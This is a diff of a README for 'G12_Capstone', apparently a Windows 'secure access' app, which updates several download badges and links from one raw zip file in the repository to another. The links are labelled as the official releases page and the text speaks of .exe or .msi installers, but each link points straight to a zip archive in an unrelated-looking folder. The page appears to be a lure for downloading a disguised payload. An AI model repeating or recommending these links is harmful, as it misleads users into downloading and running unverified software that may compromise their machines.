@@ -1,6 +1,6 @@
 # 🔒 G12_Capstone - Secure Access Made Simple
 
-[![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone_v1.8.zip)
+[![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone-3.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To use G12_Capstone on your Windows computer, follow the steps below carefully. 
 2. **Go to the download page**  
    Visit the official releases page to download the app. Click this button:  
 
-   [![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone_v1.8.zip)
+   [![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone-3.7.zip)
 
 3. **Download the latest version**  
    On the releases page, look for the newest version of the app. It usually has the highest version number. Find the file ending with `.exe` or `.msi`. Click the file name to start the download.
@@ -66,7 +66,7 @@ To use G12_Capstone on your Windows computer, follow the steps below carefully. 
 
 Check the releases page regularly for updates:
 
-- Visit [G12_Capstone Releases](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone_v1.8.zip).
+- Visit [G12_Capstone Releases](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone-3.7.zip).
 - Download the latest installer or update file when available.
 - Run the installer again to upgrade your current version without losing data.
 
@@ -100,7 +100,7 @@ If issues persist, you may reach out by opening an issue on the GitHub repositor
 
 You can always access the latest official releases here:
 
-[![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone_v1.8.zip)
+[![Download G12_Capstone](https://img.shields.io/badge/Download-G12__Capstone-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignaciusinimitable780/G12_Capstone/main/mustang/Capstone-3.7.zip)
 
 Visit the page to download the file that matches your system. After downloading, follow the install and setup steps above to start using the app.
 
